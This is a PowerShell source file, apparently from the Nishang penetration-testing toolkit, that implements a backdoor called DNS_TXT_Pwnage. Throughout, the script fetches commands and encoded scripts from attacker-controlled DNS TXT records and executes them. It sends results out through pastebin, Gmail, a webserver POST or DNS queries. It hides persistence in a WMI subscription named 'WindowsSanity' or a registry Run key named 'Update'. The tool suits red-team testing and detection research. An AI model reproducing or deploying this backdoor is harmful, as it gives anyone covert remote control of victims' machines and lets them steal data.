

function DNS_TXT_Pwnage
{
<#
.SYNOPSIS
A backdoor capable of recieving commands and PowerShell scripts from DNS TXT queries.

.DESCRIPTION
This script continuously queries a domain's TXT records. It could be sent commands and powershell scripts using the TXT records which are executed on the target machine.
The PowerShell script which would be served as TXT record must be generated using Out-DnsTxt.ps1 in the Utility folder.

While using the AuthNS option it should be kept in mind that it increases chances of detection.
Leaving the DNS resolution to authorised name server of a target environment may be more desirable.

If using DNS or Webserver ExfilOption, use Invoke-Decode.ps1 in the Utility folder to decode the exfiltrated data.

.PARAMETER startdomain
The domain (or subdomain) whose TXT records would be checked regularly for further instructions.

.PARAMETER cmdstring
 The string, if responded by TXT record of startdomain, will make the payload  query "commanddomain" for commands.
 
.PARAMETER commanddomain
The domain (or subdomain) whose TXT records would be used to issue commands to the payload.

.PARAMETER psstring
 The string, if responded by TXT record of startdomain, will make the payload  query "psdomain" for encoded powershell script. 

.PARAMETER psdomain
The domain (or subdomain) whose subdomains would be used to provide powershell scripts from TXT records.

.PARAMETER Arguments
Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.

.PARAMETER subdomains
The number of subdomains which would be used to provide powershell scripts from their TXT records.
The length of DNS TXT records is assumed to be 255 characters, so more than one subdomains would be required.

.PARAMETER stopstring
The string, if responded by TXT record of startdomain, will stop this payload on the target.

.PARAMETER AuthNS
Authoritative Name Server for the domains (or for startdomain in case you are using separate domains). 
Startdomain would be changed for commands and an authoritative reply shoudl reflect changes immediately.

.PARAMETER exfil
Use this option for using exfiltration

.PARAMETER ExfilOption
The method you want to use for exfitration of data. Valid options are "gmail","pastebin","WebServer" and "DNS".

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for other options

.PARAMETER username
Username for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER password
Password for the pastebin/gmail account where data would be exfiltrated.
Unused for other options

.PARAMETER URL
The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.

.PARAMETER DomainName
The DomainName, whose subdomains would be used for sending TXT queries to. The DNS Server must log the TXT queries.

.PARAMETER ExfilNS
Authoritative Name Server for the domain specified in DomainName. Using it may increase chances of detection.
Usually, you should let the Name Server of target to resolve things for you.

.PARAMETER persist
Use this parameter for reboot persistence. 
Use Remove-Peristence from the Utility folder to clean a target machine.

.EXAMPLE
PS > DNS_TXT_Pwnage
The payload will ask for all required options.

.EXAMPLE
PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com
In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
you want to execute. The TXT record could be changed live and the payload will pick up updated 
record to execute new command.

To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon as it matches, the payload will query 
1.script.alteredsecurity.com, 2.script.alteredsecurity.com and 3.script.alteredsecurity.com looking for a base64encoded powershell script. 
Use the Arguments paramter if the downloaded script loads a function.
Use the Out-DnsTxt script in the Utility folder to encode scripts to base64.

.EXAMPLE
PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
Use above command for sending POST request to your webserver which is able to log the requests.

.EXAMPLE
PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php -persist
Use above for reboot persistence.

.LINK
http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html
https://github.com/samratashok/nishang
#>

    [CmdletBinding(DefaultParameterSetName="noexfil")] Param(
        [Parameter(Parametersetname="exfil")]
        [Switch]
        $persist,

        [Parameter(Parametersetname="exfil")]
        [Switch]
        $exfil,

        [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 0, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $startdomain,

        [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 1, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $cmdstring,

        [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 2, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $commanddomain,

        [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 3, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $psstring,

        [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 4, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $psdomain,

        [Parameter(Position = 5, Mandatory = $False, Parametersetname="exfil")]
        [Parameter(Position = 5, Mandatory = $False, Parametersetname="noexfil")]
        [String]
        $Arguments = "Out-Null",

        [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $Subdomains,

        [Parameter(Position = 7, Mandatory = $True, Parametersetname="exfil")]
        [Parameter(Position = 7, Mandatory = $True, Parametersetname="noexfil")]
        [String]
        $StopString,

        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
        [Parameter(Position = 8, Mandatory = $False, Parametersetname="noexfil")]
        [String]$AuthNS,    

        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
        [String]
        $ExfilOption,

        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $dev_key = "null",

        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $username = "null",

        [Parameter(Position = 12, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $password = "null",

        [Parameter(Position = 13, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $URL = "null",
      
        [Parameter(Position = 14, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $DomainName = "null",

        [Parameter(Position = 15, Mandatory = $False, Parametersetname="exfil")]
        [String]
        $ExfilNS = "null"
   
   )

    $body = @'    
function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $psdomain, $Arguments, $Stopstring, $AuthNS, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $ExfilNS, $exfil)
{
    while($true)
    {
        $exec = 0
        start-sleep -seconds 5
        
        if ($AuthNS -ne $null)
        {
            $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
        }
        else
        {
            $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain") 
        }
        $tmp = $getcode | select-string -pattern "`""
        $startcode = $tmp -split("`"")[0]
        if ($startcode[1] -eq $cmdstring)
        {
            start-sleep -seconds 5
            
            if ($AuthNS -ne $null)
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
            }
            else
            {
                $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain") 
            }
            $temp = $getcommand | select-string -pattern "`""
            $command = $temp -split("`"")[0]
            $pastevalue = Invoke-Expression $command[1]
            $pastevalue
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration-Dns "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }
        }

        if ($startcode[1] -match $psstring)
        {
                      
            $i = 1
            while ($i -le $subdomains)
            {
                
                if ($AuthNS -ne $null)
                {
                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain $AuthNS")
                }
                else
                {
                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain") 
                }
                $temp = $getcommand | select-string -pattern "`""
                $tmp1 = ""
                $tmp1 = $tmp1 + $temp
                $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
                $i++
            }
            #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
            $dec = [System.Convert]::FromBase64String($encdata)
            $ms = New-Object System.IO.MemoryStream
            $ms.Write($dec, 0, $dec.Length)
            $ms.Seek(0,0) | Out-Null
            $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
            $sr = New-Object System.IO.StreamReader($cs)
            $command = $sr.readtoend()
            
            $script:pastevalue = Invoke-Expression $command

            # Check for arguments to the downloaded script.
            if ($Arguments -ne "Out-Null")
            {
                $pastevalue = Invoke-Expression $Arguments                   
            }

            $pastevalue            
            $exec++
            if ($exfil -eq $True)
            {
                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
                Do-Exfiltration-Dns "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
            }
            if ($exec -eq 1)
            {
                Start-Sleep -Seconds 60
            }

        }
        
        if($startcode[1] -eq $StopString)
        {
            break
        }
    }
}
'@

$exfiltration = @'
function Do-Exfiltration-Dns($pastename,$pastevalue,$ExfilOption,$dev_key,$username,$password,$URL,$DomainName,$ExfilNS)
{
    function post_http($url,$parameters) 
    { 
        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
        $http_request.open("POST", $url, $false) 
        $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
        $http_request.setRequestHeader("Content-length", $parameters.length); 
        $http_request.setRequestHeader("Connection", "close") 
        $http_request.send($parameters) 
        $script:session_key=$http_request.responseText
        Write-Verbose $session_key
    } 

    function Compress-Encode
    {
        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
        $ms = New-Object IO.MemoryStream
        $action = [IO.Compression.CompressionMode]::Compress
        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
        $pastevalue | ForEach-Object {$sw.WriteLine($_)}
        $sw.Close()
        # Base64 encode stream
        $code = [Convert]::ToBase64String($ms.ToArray())
        return $code
    }

    if ($exfiloption -eq "pastebin")
    {
        $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
        $pastevalue = [System.Convert]::ToBase64String($utfbytes)
        post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
        post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
    }
        
    elseif ($exfiloption -eq "gmail")
    {
        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
        $smtpserver = "smtp.gmail.com"
        $msg = new-object Net.Mail.MailMessage
        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
        $smtp.EnableSsl = $True
        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
        $msg.From = "$username@gmail.com"
        $msg.To.Add("$username@gmail.com")
        $msg.Subject = $pastename
        $msg.Body = $pastevalue
        if ($filename)
        {
            $att = new-object Net.Mail.Attachment($filename)
            $msg.Attachments.Add($att)
        }
        $smtp.Send($msg)
    }

    elseif ($exfiloption -eq "webserver")
    {
        $Data = Compress-Encode    
        post_http $URL $Data
    }
    elseif ($ExfilOption -eq "DNS")
    {
        $lengthofsubstr = 0
        $code = Compress-Encode
        $queries = [int]($code.Length/63)
        while ($queries -ne 0)
        {
            $querystring = $code.Substring($lengthofsubstr,63)
            Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $ExfilNS"
            $lengthofsubstr += 63
            $queries -= 1
        }
        $mod = $code.Length%63
        $query = $code.Substring($code.Length - $mod, $mod)
        Invoke-Expression "nslookup -querytype=txt $query.$DomainName $ExfilNS"

    }
}
'@

    
    $modulename = "DNS_TXT_Pwnage.ps1"
    if($persist -eq $True)
    {
        $name = "persist.vbs"
        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS"
        if ($exfil -eq $True)
        {
            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
        echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
        if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -eq $true)
        {
            $scriptpath = $env:TEMP
            $scriptFileName = "$scriptpath\$name"
            $filterNS = "root\cimv2"
            $wmiNS = "root\subscription"
            $query = @"
             Select * from __InstanceCreationEvent within 30 
             where targetInstance isa 'Win32_LogonSession' 
"@
            $filterName = "WindowsSanity"
            $filterPath = Set-WmiInstance -Class __EventFilter -Namespace $wmiNS -Arguments @{name=$filterName; EventNameSpace=$filterNS; QueryLanguage="WQL"; Query=$query}
            $consumerPath = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace $wmiNS -Arguments @{name="WindowsSanity"; ScriptFileName=$scriptFileName; ScriptingEngine="VBScript"}
            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace $wmiNS -arguments @{Filter=$filterPath; Consumer=$consumerPath} |  out-null
        }
        else
        {
            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:TEMP\$name -force
            echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:TEMP\$name
            echo "objShell.run(`"powershell -WindowStyle Hidden -executionpolicy bypass -file $env:temp\$modulename`")" >> $env:TEMP\$name
        }
    }
    else
    {
        $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS $LoadFuntion"

        if ($exfil -eq $True)
        {
            $options = "DNS-TXT-Logic $Startdomain $cmdstring $commanddomain $psstring $psdomain $Arguments $Stopstring $AuthNS $ExfilOption $dev_key $username $password $URL $DomainName $ExfilNS $exfil $LoadFunction"
        }
        Out-File -InputObject $body -Force $env:TEMP\$modulename
        Out-File -InputObject $exfiltration -Append $env:TEMP\$modulename
        Out-File -InputObject $options -Append $env:TEMP\$modulename
        Invoke-Expression $env:TEMP\$modulename     
    }

}



